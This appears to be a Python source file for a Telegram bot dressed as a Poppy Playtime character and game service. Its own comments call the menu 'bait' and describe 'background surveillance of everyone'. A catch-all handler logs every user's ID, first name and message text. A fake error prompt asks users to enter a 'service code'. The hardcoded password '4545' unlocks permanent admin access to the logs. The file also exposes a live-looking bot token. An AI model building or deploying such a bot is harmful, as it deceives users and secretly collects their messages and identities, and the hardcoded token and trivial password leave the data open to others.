import telebot
import random
from threading import Thread
from flask import Flask
from datetime import datetime

TOKEN = '8528956901:AAErBMx_VE5QpsOo6Sv_APS26zWzVCeNwys'
bot = telebot.TeleBot(TOKEN)
ADMIN_PASSWORD = "4545"

verified_admins = []
logs = []

app = Flask('')
@app.route('/')
def home(): return "SYSTEM ONLINE"

def run(): app.run(host="0.0.0.0", port=8080)

def save_log(message):
    entry = f"[{datetime.now().strftime('%H:%M')}] ID:{message.from_user.id} ({message.from_user.first_name}): {message.text}"
    logs.append(entry)

# --- ГЛАВНОЕ МЕНЮ (ПРИМАНКА) ---
@bot.message_handler(commands=['start'])
def start(message):
    save_log(message)
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("👤 Создать персонажа", "✨ Анимированный ИИ", "🎮 Игры")
    bot.send_message(message.chat.id, "🌋 Система Playtime Co. активна.\nВыберите модуль или введите сервисный код.", reply_markup=markup)

# --- ФУНКЦИИ ПЕРСОНАЖЕЙ ---
@bot.message_handler(func=lambda message: message.text == "👤 Создать персонажа")
def create_char(message):
    save_log(message)
    chars = ["Хагги Вагги", "Кисси Мисси", "Прототип", "Кот-Дремот", "ДогДэй"]
    bot.reply_to(message, f"🧬 ГЕНЕРАЦИЯ... Готово!\nВаш ИИ-персонаж: {random.choice(chars)}\nСила: {random.randint(50, 100)}\nСтатус: В ожидании команд.")

@bot.message_handler(func=lambda message: message.text == "✨ Анимированный ИИ")
def ai_anim(message):
    save_log(message)
    bot.reply_to(message, "📽 Ошибка: Требуется синхронизация с сервером Playtime. Введите сервисный код для доступа.")

@bot.message_handler(func=lambda message: message.text == "🎮 Игры")
def games(message):
    save_log(message)
    bot.send_message(message.chat.id, "🔮 Используйте /games для списка игр.")

# --- РЕЖИМ РАЗРАБОТЧИКА (ПАРОЛЬ ОДИН РАЗ) ---
@bot.message_handler(func=lambda message: message.text == ADMIN_PASSWORD)
def admin_auth(message):
    if message.from_user.id not in verified_admins:
        verified_admins.append(message.from_user.id)
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📊 Статус", "📝 Логи", "🧹 Очистить", "🔙 Назад")
    bot.reply_to(message, "🔓 РЕЖИМ РАЗРАБОТЧИКА АКТИВИРОВАН.\nПароль больше не требуется.", reply_markup=markup)

# --- КНОПКИ УПРАВЛЕНИЯ (БЕЗ ПАРОЛЯ ДЛЯ ТЕБЯ) ---
@bot.message_handler(func=lambda message: message.text == "📝 Логи")
def show_logs(message):
    if message.from_user.id in verified_admins:
        res = "\n".join(logs[-25:]) if logs else "Логов пока нет."
        bot.send_message(message.chat.id, f"📡 АКТИВНОСТЬ СИСТЕМЫ:\n\n{res}")

@bot.message_handler(func=lambda message: message.text == "📊 Статус")
def show_status(message):
    if message.from_user.id in verified_admins:
        bot.send_message(message.chat.id, f"⚙️ СЕРВЕР: OK\n👥 ЗАПИСЕЙ В БАЗЕ: {len(logs)}")

@bot.message_handler(func=lambda message: message.text == "🔙 Назад")
def go_back(message):
    start(message)

# --- ФОНОВАЯ СЛЕЖКА ЗА ВСЕМИ ---
@bot.message_handler(func=lambda message: True)
def monitor(message):
    save_log(message)

if __name__ == "__main__":
    Thread(target=run).start()
    bot.polling(none_stop=True)
